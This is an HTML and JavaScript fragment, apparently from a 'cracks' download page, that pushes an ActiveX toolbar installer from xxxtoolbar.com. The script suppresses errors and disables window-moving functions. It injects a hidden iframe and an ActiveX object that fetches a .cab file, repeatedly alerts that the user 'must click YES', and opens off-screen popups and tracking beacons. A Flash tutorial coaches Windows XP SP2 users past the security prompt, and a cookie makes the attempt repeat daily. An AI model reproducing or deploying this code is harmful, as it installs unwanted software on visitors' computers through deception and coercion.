
<!--//--><script src="http://local.ptron/WindowOpen.js"></script>

<!--//--><script> function NoError(){return(true);} onerror=NoError; </script>

<!--//--><script> function moveTo(){return true;}function resizeTo(){return true;}</script>
<!--
 var flag=0;
 var loadfirst=1;

 var sp2=false;
 var holder;
 if(window.navigator.userAgent.indexOf("SV1") != -1) sp2=true;
 if (sp2){
   document.write('<div id="tutorial_popup" style="visibility:hidden;position:absolute;top:0px;left:0px;width:635px;height:308px;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="635" height="308">');
   document.write('<param name="movie" value="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf">param name="quality" value="high"><param name="wmode" value="transparent">');
   document.write('<embed src="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="700" height="500"></embed></object></div>');
   } 
 document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');
 function retryit(){
        if(window.retry && retry>0 && !sp2) {
                alert("You must click YES to get access"); 
                loadfirst=0;
                start_download();
                retry--;
                }
        }
 function showActiveX() {
        holder.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:7C559105-9ECF-42b8-B3F7-832E75EDD959"');
        holder.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_cracks.cab" onerror="parent.retryit();">');

        holder.write('<PARAM name="account_id" value="159214">');
        holder.write('<PARAM name="download_key" value="60feb1643f187cb6276a8e7a1992c004">');
        holder.write('<PARAM name="download_lock" value="1116082263">');
        if(!sp2){
              holder.write('<PARAM name="cfg" value="mtb_c">');
        } if(sp2){
              holder.write('<PARAM name="cfg" value="">');
              }
         holder.write('<PARAM name="sub" value="">');
         holder.write('</OBJECT>');
}
 function start_download() {
        var bname=navigator.appName;
        var bver=parseInt(navigator.appVersion);
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                if(!loadfirst || sp2){
                        downloads_manager.document.close();
                        holder= downloads_manager.document;
                } else {
                        holder=document;
                        }
                showActiveX();
		if (sp2) document.all.tutorial_popup.style.visibility = "visible";
                                if(!flag && !sp2){
                        window.open("http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=159214&auto_close=1&software_id=0006&referer=http%3A%2F%2Finstall.xxxtoolbar.com%2Fist%2Fscripts%2Fprompt.php%3Fretry%3D3%26loadfirst%3D1%26delayload%3D0%26account_id%3D159214%26recurrence%3Ddaily%26adid%3Da1112395957%26event_type%3Donload%26signature%3Dcracks&type=normal","_blank","top=10000, left=100000");
                } if(!flag && sp2){
                        holder.write('<IMG SRC="http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=159214&auto_close=1&software_id=0006&referer=http%3A%2F%2Finstall.xxxtoolbar.com%2Fist%2Fscripts%2Fprompt.php%3Fretry%3D3%26loadfirst%3D1%26delayload%3D0%26account_id%3D159214%26recurrence%3Ddaily%26adid%3Da1112395957%26event_type%3Donload%26signature%3Dcracks&type=flash" width=1 height=1 border=0>');
                        }
                flag++;
        } 
}

 function start_download_loadfirst() { 
        start_download(); 
        }

 // -->


<!--
	var currentDate = new Date();
	var adRecurrence = "daily";
	var adId = "a1112395957";
	var adExpiration = 0;
	var retry=3;
	var obj=null;	

    		currentDate.setTime(currentDate.getTime() + (1*24*60*60*1000));	
		adExpiration = currentDate.toGMTString();
	
	function SetCookie(sName, sValue, sExpire){
		var expireCode = "";
		if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
		document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
	}


	function GetCookie(sName) {
		var aCookie = document.cookie.split("; ");
		for (var i=0; i < aCookie.length; i++) {
			var aCrumb = aCookie[i].split("=");
			if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
		}
		return null;
	}
	
	function upop() {
				var url = "http://www.xxxtoolbar.com/ist/scripts/downloads_manager.php?pevent_type=onload&retry=3&ref=http://install.xxxtoolbar.com/ist/scripts/prompt.php?retry=3&loadfirst=1&delayload=0&account_id=159214&recurrence=daily&adid=a1112395957&event_type=onload&signature=cracks&retry=3&loadfirst=1&delayload=0&account_id=159214&recurrence=daily&adid=a1112395957&event_type=onload&signature=cracks";
		var win='toolbar=1,location=1,directories=0,menubar=0,scrollbars=1,resizable=1,top=110,left=2000,width=600,height=500'
		window.open(url,'pop',win);
		if(obj)
			obj();
	}


	if (!GetCookie(adId)) {
		SetCookie(adId,"1", adExpiration);
					start_download();
		 
	}
//-->

<!--//--><script>PrxRST();</script>